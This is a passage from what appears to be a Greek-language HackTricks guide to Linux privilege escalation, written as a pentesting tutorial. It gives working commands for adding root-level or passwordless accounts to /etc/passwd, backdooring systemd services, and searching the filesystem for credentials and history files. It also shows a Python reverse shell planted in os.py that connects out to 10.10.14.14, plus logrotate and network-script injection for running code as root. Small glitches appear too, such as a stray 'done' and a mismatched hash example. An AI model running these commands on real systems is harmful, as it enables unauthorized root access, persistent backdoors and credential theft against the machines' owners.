mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Στη συνέχεια, πρόσθεσε τον χρήστη `hacker` και πρόσθεσε τον δημιουργημένο κωδικό πρόσβασης.
Δημιουργημένος κωδικός πρόσβασης: `W3v!7qZp9r$L`
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Π.χ.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Μπορείτε τώρα να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε έναν dummy user χωρίς password.\
ΠΡΟΣΟΧΗ: μπορεί να υποβαθμίσετε την τρέχουσα ασφάλεια του μηχανήματος.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ΣΗΜΕΙΩΣΗ: Σε πλατφόρμες BSD το `/etc/passwd` βρίσκεται στο `/etc/pwd.db` και `/etc/master.passwd`, επίσης το `/etc/shadow` έχει μετονομαστεί σε `/etc/spwd.db`.

Πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο διαμόρφωσης υπηρεσίας**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν η μηχανή τρέχει έναν **tomcat** server και μπορείτε να **τροποποιήσετε το αρχείο ρυθμίσεων υπηρεσίας Tomcat μέσα στο /etc/systemd/,** τότε μπορείτε να τροποποιήσετε τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Το backdoor σας θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει ο tomcat.

### Έλεγχος φακέλων

Οι παρακάτω φάκελοι μπορεί να περιέχουν αντίγραφα ασφαλείας ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορείτε να διαβάσετε τον τελευταίο, αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Παράξενη Τοποθεσία/Owned αρχεία
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Τροποποιημένα αρχεία τα τελευταία λεπτά
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB αρχεία
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυφά αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries στο PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Αρχεία Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν κωδικούς πρόσβασης

Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ψάχνει για **πολλά πιθανά αρχεία που θα μπορούσαν να περιέχουν κωδικούς πρόσβασης**.\
**Ένα ακόμη ενδιαφέρον εργαλείο** που μπορείτε να χρησιμοποιήσετε για αυτό είναι: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) το οποίο είναι μια εφαρμογή ανοιχτού κώδικα που χρησιμοποιείται για την ανάκτηση πολλών κωδικών πρόσβασης αποθηκευμένων σε έναν τοπικό υπολογιστή για Windows, Linux & Mac.

### Καταγραφές

Αν μπορείτε να διαβάσετε αρχεία καταγραφής, μπορεί να καταφέρετε να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο περίεργο είναι ένα αρχείο καταγραφής, τόσο πιο ενδιαφέρον θα είναι (πιθανώς).\
Επίσης, μερικά "**bad**" διαμορφωμένα (backdoored?) **audit logs** μπορεί να σας επιτρέψουν να **καταγράψετε κωδικούς πρόσβασης** μέσα στα αρχεία καταγραφής ελέγχου όπως εξηγείται σε αυτό το post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάσετε logs**, η ομάδα [**adm**](interesting-groups-linux-pe/index.html#adm-group) θα είναι πολύ χρήσιμη.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Επίσης θα πρέπει να ελέγχεις για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομά** τους ή μέσα στο **περιεχόμενο**, και επίσης να ελέγχεις για IPs και emails μέσα σε logs, ή hashes regexps.\
Δεν θα αναφέρω εδώ πώς να κάνεις όλα αυτά αλλά αν σε ενδιαφέρει μπορείς να δεις τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Python library hijacking

If you know from **πού** a python script is going to be executed and you **μπορείς να γράψεις μέσα** σε αυτόν τον φάκελο ή μπορείς να **τροποποιήσεις python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

Για να **backdoor the library** απλά πρόσθεσε στο τέλος της βιβλιοθήκης os.py την παρακάτω γραμμή (άλλαξε το IP και το PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση Logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **write permissions** σε ένα αρχείο καταγραφής ή στους γονικούς καταλόγους του να αποκτήσουν ενδεχομένως αυξημένα προνόμια. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά τρέχει ως **root**, μπορεί να χειραγωγηθεί ώστε να εκτελέσει αυθαίρετα αρχεία, ειδικά σε καταλόγους όπως _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγχετε δικαιώματα όχι μόνο σε _/var/log_ αλλά και σε οποιονδήποτε κατάλογο όπου εφαρμόζεται περιστροφή αρχείων καταγραφής.

> [!TIP]
> Αυτή η ευπάθεια επηρεάζει την έκδοση `logrotate` `3.18.0` και παλαιότερες

Περισσότερες πληροφορίες για την ευπάθεια μπορείτε να βρείτε σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια με [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** οπότε κάθε φορά που βρίσκετε ότι μπορείτε να τροποποιήσετε logs, ελέγξτε ποιος τα διαχειρίζεται και δείτε αν μπορείτε να αυξήσετε προνόμια αντικαθιστώντας τα logs με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Αν, για οποιονδήποτε λόγο, ένας χρήστης μπορεί να **γράψει** ένα script `ifcf-<whatever>` στο _/etc/sysconfig/network-scripts_ **ή** να **τροποποιήσει** ένα υπάρχον, τότε το **σύστημά σας είναι pwned**.

Τα network scripts, π.χ. _ifcg-eth0_, χρησιμοποιούνται για συνδέσεις δικτύου. Μοιάζουν ακριβώς με αρχεία .INI. Ωστόσο, είναι \~sourced\~ στο Linux από το Network Manager (dispatcher.d).

Στη δική μου περίπτωση, το `NAME=` που αποδίδεται σε αυτά τα network scripts δεν χειρίζεται σωστά. Αν έχετε **λευκό/κενό διάστημα στο όνομα, το σύστημα προσπαθεί να εκτελέσει το τμήμα μετά το λευκό/κενό διάστημα**. Αυτό σημαίνει ότι **ό,τι βρίσκεται μετά το πρώτο κενό εκτελείται ως root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Σημειώστε το κενό διάστημα μεταξύ του Network και /bin/id_)

### **init, init.d, systemd, and rc.d**

Ο κατάλογος `/etc/init.d` φιλοξενεί **scripts** για το System V init (SysVinit), το **κλασικό Linux service management system**. Περιλαμβάνει scripts για `start`, `stop`, `restart` και μερικές φορές `reload` υπηρεσιών. Αυτά μπορούν να εκτελεστούν απευθείας ή μέσω συμβολικών συνδέσμων που βρίσκονται στο `/etc/rc?.d/`. Μια εναλλακτική διαδρομή σε συστήματα Redhat είναι `/etc/rc.d/init.d`.

Αντίθετα, το `/etc/init` συνδέεται με το **Upstart**, ένα νεότερο **service management** που εισήγαγε η Ubuntu, το οποίο χρησιμοποιεί αρχεία ρυθμίσεων για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση σε Upstart, τα SysVinit scripts εξακολουθούν να χρησιμοποιούνται παράλληλα με τις ρυθμίσεις του Upstart λόγω ενός στρώματος συμβατότητας στο Upstart.

Το **systemd** εμφανίζεται ως μοντέρνος initialization και service manager, προσφέροντας προηγμένες δυνατότητες όπως on-demand daemon starting, automount management και system state snapshots. Οργανώνει αρχεία σε `/usr/lib/systemd/` για distribution packages και σε `/etc/systemd/system/` για τροποποιήσεις του administrator, απλοποιώντας τη διαχείριση του συστήματος.

## Άλλα Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Απόδραση από restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Τα Android rooting frameworks συνήθως κάνουν hook ένα syscall για να εκθέσουν privileged λειτουργίες του kernel σε έναν userspace manager. Αδύναμη authentication του manager (π.χ. έλεγχοι υπογραφής βασισμένοι σε FD-order ή κακές πολιτικές password) μπορεί να επιτρέψει σε μια τοπική app να προσποιηθεί τον manager και να αποκτήσει root σε συσκευές που είναι ήδη rooted. Μάθετε περισσότερα και λεπτομέρειες εκμετάλλευσης εδώ:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Η regex-driven service discovery στο VMware Tools/Aria Operations μπορεί να εξάγει ένα binary path από τις γραμμές εντολών διεργασιών και να το εκτελέσει με -v υπό privileged context. Επιεικείς patterns (π.χ. χρήση του \S) μπορεί να ταιριάξουν attacker-staged listeners σε εγγράψιμες τοποθεσίες (π.χ. /tmp/httpd), οδηγώντας σε εκτέλεση ως root (CWE-426 Untrusted Search Path).

Μάθετε περισσότερα και δείτε ένα γενικευμένο pattern εφαρμόσιμο σε άλλα discovery/monitoring stacks εδώ:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)

{{#include ../../banners/hacktricks-training.md}}
